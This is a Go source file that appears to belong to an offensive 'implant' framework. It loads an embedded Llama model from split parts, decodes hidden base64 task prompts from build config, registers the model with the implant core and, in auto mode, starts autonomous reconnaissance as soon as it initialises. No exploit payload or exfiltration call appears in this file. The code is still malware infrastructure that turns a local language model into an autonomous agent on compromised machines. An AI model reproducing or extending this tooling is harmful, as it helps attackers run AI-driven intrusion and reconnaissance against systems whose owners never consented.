//go:build llama_embed
// +build llama_embed

//go:generate go run ../../../scripts/prepare-model-parts.go

package llama

import (
	"bytes"
	"embed"
	"encoding/base64"
	"encoding/json"
	"io/fs"
	"log"
	"sort"
	"strconv"

	"github.com/r74tech/virga/internal/implant/logger"

	"github.com/r74tech/virga/internal/implant/config"
)

//go:embed model_parts/*
var modelFS embed.FS

// loadEmbeddedModel dynamically loads and merges all model parts
func loadEmbeddedModel() []byte {
	entries, err := fs.ReadDir(modelFS, "model_parts")
	if err != nil {
		log.Printf("[Llama] Warning: No model parts found: %v", err)
		return nil
	}

	// Sort file names to ensure correct order (part_aa, part_ab, etc.)
	sort.Slice(entries, func(i, j int) bool {
		return entries[i].Name() < entries[j].Name()
	})

	var buf bytes.Buffer
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		data, err := modelFS.ReadFile("model_parts/" + entry.Name())
		if err != nil {
			log.Printf("[Llama] Failed to read model part %s: %v", entry.Name(), err)
			continue
		}

		log.Printf("[Llama] Loading model part %s (%d bytes)", entry.Name(), len(data))
		buf.Write(data)
	}

	if buf.Len() == 0 {
		log.Println("[Llama] Warning: No model data loaded")
		return nil
	}

	log.Printf("[Llama] Successfully loaded model (%.2f MB total)", float64(buf.Len())/(1024*1024))
	return buf.Bytes()
}

var embeddedModel []byte

func init() {
	log.Println("[Llama] Initializing embedded Llama model...")
	log.Printf("[Llama] Auto mode enabled: %v", config.BuildLlamaAutoMode == "true")
	log.Printf("[Llama] Initial tasks configured: %v", config.BuildLlamaInitialTasks != "")

	// In llama_embed mode, the model is embedded via go:embed as split parts
	// We should NOT check for self-extracting binary metadata, as the last 8 bytes
	// of the executable may be random code/data that could be misinterpreted as metadata
	log.Println("[Llama] Using llama_embed mode - loading model from go:embed split parts")
	embeddedModel = loadEmbeddedModel()

	if embeddedModel == nil || len(embeddedModel) == 0 {
		log.Println("[Llama] Warning: No embedded model loaded")
		return
	}

	// Parse build-time configuration
	context := 8192
	if val, err := strconv.Atoi(config.BuildLlamaContext); err == nil && val > 0 {
		context = val
	}

	maxTokens := 2048
	if val, err := strconv.Atoi(config.BuildLlamaMaxTokens); err == nil && val > 0 {
		maxTokens = val
	}

	maxIterations := 50
	if val, err := strconv.Atoi(config.BuildLlamaMaxIterations); err == nil && val > 0 {
		maxIterations = val
	}

	temperature := 0.3
	if val, err := strconv.ParseFloat(config.BuildLlamaTemperature, 64); err == nil && val > 0 {
		temperature = val
	}

	// Parse task prompts from build config
	taskPrompts := make(map[string]string)
	if config.BuildLlamaTaskPrompts != "" {
		if decoded, err := base64.StdEncoding.DecodeString(config.BuildLlamaTaskPrompts); err == nil {
			json.Unmarshal(decoded, &taskPrompts)
		}
	}

	// Configure based on build flags
	llamaConfig := Config{
		ModelData:      embeddedModel,
		UseMemory:      true,
		Context:        context,
		GPULayers:      0,
		Threads:        4,
		Temperature:    temperature,
		TopK:           40,
		TopP:           0.95,
		MaxTokens:      maxTokens,
		MaxIterations:  maxIterations,
		EnableAutoMode: config.BuildLlamaAutoMode == "true",
		SystemPrompt:   getSystemPromptFromPreset(config.BuildLlamaSystemPrompt),
		TaskPrompts:    taskPrompts,
	}

	integration, err := NewLlamaIntegration(llamaConfig)
	if err != nil {
		log.Printf("Failed to initialize Llama integration: %v", err)
		return
	}

	// Register with implant core
	RegisterLlamaIntegration(integration)

	// Start task workers for background processing
	integration.StartWorkers()
	log.Printf("[Llama] Task workers started (count: %d)", llamaConfig.MaxWorkers)

	// Start initial reconnaissance if auto mode is enabled
	if llamaConfig.EnableAutoMode {
		log.Println("[Llama] Auto mode is enabled, preparing initial tasks...")
		// Parse initial tasks from build config
		if config.BuildLlamaInitialTasks != "" {
			log.Printf("[Llama] Decoding initial tasks from build config...")
			if decoded, err := base64.StdEncoding.DecodeString(config.BuildLlamaInitialTasks); err == nil {
				var tasks []struct {
					Type        string `json:"type"`
					Description string `json:"description"`
				}
				if err := json.Unmarshal(decoded, &tasks); err == nil && len(tasks) > 0 {
					log.Printf("[Llama] Starting %d initial tasks...", len(tasks))
					for _, task := range tasks {
						log.Printf("[Llama]   - Task: %s (%s)", task.Type, task.Description)
					}
					integration.RunInitialReconnaissanceWithTasks(tasks)
				} else {
					log.Printf("[Llama] Failed to parse initial tasks: %v", err)
					integration.RunInitialReconnaissance()
				}
			} else {
				log.Printf("[Llama] Failed to decode initial tasks: %v", err)
				integration.RunInitialReconnaissance()
			}
		} else {
			log.Println("[Llama] No initial tasks configured, using default reconnaissance")
			integration.RunInitialReconnaissance()
		}
	} else {
		log.Println("[Llama] Auto mode is disabled, skipping initial tasks")
	}

	modelSizeMB := float64(len(embeddedModel)) / (1024 * 1024)
	log.Printf("[Llama] Model initialized successfully (%.2f MB)", modelSizeMB)

	// Also log for visibility
	if implantLogger := logger.Get(); implantLogger != nil {
		implantLogger.LogLlama("Model initialization complete", map[string]interface{}{
			"model_size_mb": modelSizeMB,
		})
		if llamaConfig.EnableAutoMode {
			implantLogger.LogLlama("Autonomous mode enabled - starting initial reconnaissance tasks")
		}
	}
}

// getSystemPromptFromPreset returns the appropriate system prompt based on preset name
func getSystemPromptFromPreset(preset string) string {
	// Use the centralized prompt definitions from prompts.go
	return GetPromptByPreset(preset)
}

// Note: All prompt definitions are centralized in prompts.go
// The preset name from config determines which prompt is used
